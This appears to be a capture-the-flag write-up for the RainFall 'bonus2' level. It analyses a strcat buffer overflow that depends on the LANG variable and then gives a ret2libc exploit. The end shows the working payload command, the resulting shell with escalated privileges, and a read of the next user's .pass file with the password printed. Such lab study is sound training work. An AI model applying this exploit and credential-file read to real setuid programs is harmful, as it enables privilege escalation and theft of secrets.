# Analysis

The program here is quite long, because in the first part of the main function, it just copies our paramters (with secured strncpy() call) into buffers and gets "LANG"
environment variable and calls a memcmp() on it, to check if it's equal to "fi" or "nl" (that information is then passed to the function greetuser() as an integer flag).
greetuser() function will check if the flag is eiter equal to 1 or 2, and will adapt the following behavior depending on it. If the flag is set to 0, then it means the "LANG" environment variable is neither equal to "fi" nor "nl".
The default behavior is the following:
The program copies a static string "Hello " into a stack buffer, and concatenates in it our given variable as argv[1] (through strcat() function call), then
the destination pointer is passed to puts() and the string "Hello `argv[1]`" is displayed.
If LANG is equal to either "fi" or "nl", the displayed message will be changed from "Hello " to the corresponding other language (finland or netherland).
The vulnerability here is on the strcat function call (the program will overlow to the next given parameter), thanks to the LANG environment variable.
Indeed, for the default behavior, the functions are protected and the buffer can handle exactly the right ammount of bytes needed, but when we change the language through LANG environment variable, the displayed message is longer, and that has not been properly handled by the developer : it leads to a buffer overflow that can be exploited with a basic ret2libc trick.

# Exploit + Crafting

To exploit it, we need to set LANG environment variable to either "fi" or "nl" so that the greeting string is longer.
We overflow the 4 bytes after the 23rd offset on the second parameter, and put the address of system() function there (which will overwrite the saved EIP of greetuser() function).
Right at the `ret` instruction call, the beginning of our buffer (1st parameter argv[1]) is on the stack, we can use it to pass parameters to system().
We can easly find where "sh" string is, through the "find" command in gdb, and use it in a ret2libc basic context where the "DDDD" are return address of system so we don't care about it, it will segfault when we leave the shell.

# Shooting

bonus2@RainFall:~$ ./bonus2 `python -c 'print "DDDD" + "\xf5\x89\x04\x08" + "A"*34'` `python -c 'print "A"*23 + "\x60\xb0\xe6\xb7"'`
Goedemiddag! DDDDAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA`��
$ id
uid=2012(bonus2) gid=2012(bonus2) euid=2013(bonus3) egid=100(users) groups=2013(bonus3),100(users),2012(bonus2)
$ cat /home/user/bonus3/.pass
71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
